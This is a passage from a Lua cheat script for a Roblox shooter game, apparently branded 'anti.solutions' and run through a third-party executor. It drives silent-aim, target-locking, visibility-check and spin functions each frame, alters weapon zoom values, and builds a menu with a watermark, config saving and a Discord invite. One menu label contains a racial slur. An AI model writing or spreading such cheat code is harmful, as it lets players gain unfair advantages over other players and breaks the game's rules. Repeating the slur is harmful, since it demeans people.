    if replicatestorage.Players and replicatestorage.Players:FindFirstChild(localplayer.Name) and replicatestorage.Players:FindFirstChild(localplayer.Name).Inventory then
        local plr = replicatestorage.Players:FindFirstChild(localplayer.Name)
        for i,v in plr:GetDescendants() do
            if v:FindFirstChild("ItemProperties") and GunTables[v.Name] then
                v.ItemProperties.Tool:SetAttribute("Zoom", library.flags.ads_value)
                v.ItemProperties.Tool:SetAttribute("ZoomSpeed", -15)
            end
        end
    end
    if enables.cursor.CustomPos then
        enables.cursor.Position = castgun()
    end

    --// Updates
    functions:TargetPlayer()
    functions:silentaim()
    functions:updateCircle()
    functions:VisibleCheck()
    functions:spin()
    --
 end)

 --// Configures
 local uisettings = tabs.settings:createGroup('left', 'Menu')
 
 --// Menu
     local Watermark = Instance.new("ScreenGui")
     Watermark.Name = "Watermark"
     Watermark.Parent = game.CoreGui
     Watermark.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
     local Text = Instance.new("TextLabel")
     Text.Parent = Watermark
     Text.BackgroundColor3 = Color3.fromRGB(0,0,0)
     Text.TextColor3 = Color3.fromRGB(255, 255, 255)
     Text.BorderSizePixel = 0
     Text.AnchorPoint = Vector2.new(0.5, 0.5)
     Text.Position = UDim2.new(0.5, 0, 0.5, -450)
     Text.AutomaticSize = Enum.AutomaticSize.XY
     Text.Size = UDim2.new(0, 35, 0, 20)
     Text.RichText = true
     Text.Font = Enum.Font.Code
     Text.Visible = true
     Text.TextSize = 14
     local User = identifyexecutor()
     local FPS = 0
     Text.Text = "nil"
 
     local RS = game:GetService("RunService")
 
     RS.RenderStepped:Connect(function()
         FPS = FPS + 1
     end)
 
     spawn(function()
         while wait(0.00000000000001) do
             local time = os.date('%X', os.time())
             local Ping = game:GetService('Stats') ~= nil and math.floor(game:GetService('Stats').Network.ServerStatsItem["Data Ping"]:GetValue())
             local fps = game:GetService('Stats').FrameRateManager:FindFirstChild('RenderAverage') and string.format('%.1f', 1000 / game:GetService('Stats').FrameRateManager.RenderAverage:GetValue())
             local date = os.date("%b. %d, %Y")
             Text.Text = " anti.solutions / executor: "..User.." / ping: "..Ping.." / fps: "..fps.." / time: "..time.." / date: "..date.." "
             FPS = 0
         end
     end)
 
     local Border = Instance.new("UIStroke")
     Border.Parent = Text
     Border.ApplyStrokeMode = "Border"
     Border.Color = Color3.new(1,1,1)
 
     local Gradient = Instance.new("UIGradient")
     Gradient.Parent = Border
     Gradient.Color = ColorSequence.new({
         ColorSequenceKeypoint.new(0, Color3.new(0.952941, 0.356863, 0.874510)),
         ColorSequenceKeypoint.new(1, Color3.new(0, 0, 0))
     })
 
     spawn(function()
         while task.wait() do
             Gradient.Rotation = Gradient.Rotation + 1
         end
     end)
 --
 do
     uisettings:addToggle({text = "menu bind",default = true,flag = "menubind_toggle",callback = function(Value)
     end}):addKeybind({text = "menu bind",type = "toggle",key = Enum.KeyCode.End,flag = "menubindkeybind_toggle",callback = function(Value)
         library.keybind = Value
     end})
     
     uisettings:addToggle({text = "watermark",default = true,flag = "watermark_toggle",callback = function(Value)
         Text.Visible = Value
     end})
     uisettings:addToggle({text = "animated title",default = true,flag = "animated_text",callback = function(Value)
         library.AnimatedText = Value
     end})
     uisettings:addDivider()
     uisettings:addButton({text = "discord invite",callback = function(Value)
        setclipboard("https://discord.gg/vmYFhtWNSc")
        library:Notify("anti.solutions - succesfully copied discord invite!", 5)
     end})
     uisettings:addLabel({text = "All Made by: @lksiwjas"})
     uisettings:addLabel({text = "Supports Solara WOWZERS"})
     uisettings:addLabel({text = "Best Solara script so far!"})
     uisettings:addLabel({text = "Niggas wildin"})
 end
 --
 local gameTab = tabs.settings:createGroup('center', 'Game')
 
 --// Game
 do
     gameTab:addSlider({text = "fps cap:", min = 0, max = 999, suffix = "fps", float = 1, default = 999, flag = "fpscap_slider",callback = function(Value)
         setfpscap(Value)
     end})
     gameTab:addButton({text = "copy join code",callback = function(Value)
         setclipboard(("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s')"):format(game.PlaceId, game.JobId))
         library:Notify("anti.solutions - succesfully copied join code!", 5)
     end})
     gameTab:addButton({text = "rejoin",callback = function(Value)
         game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId)
         library:Notify("anti.solutions - succesfully rejoining server!", 5)
     end})
 end

 --// Config
 local createconfigs = tabs.settings:createGroup('right', 'Config')
 do
    createconfigs:addTextbox({text = "name:",flag = "config_name"})
    createconfigs:addButton({text = "create",callback = library.createConfig})
    createconfigs:addConfigbox({flag = 'config_box',values = {}})
    createconfigs:addButton({text = "load",callback = library.loadConfig})
    createconfigs:addButton({text = "update",callback = library.saveConfig})
    createconfigs:addButton({text = "delete",callback = library.deleteConfig})
 end
 library:refreshConfigs()
 library:Notify("Loader : Access Successful!", 5)
 wait(0.1) library:Notify(string.format("Success: loaded in %.2fs", os.clock() - os_clock),20)
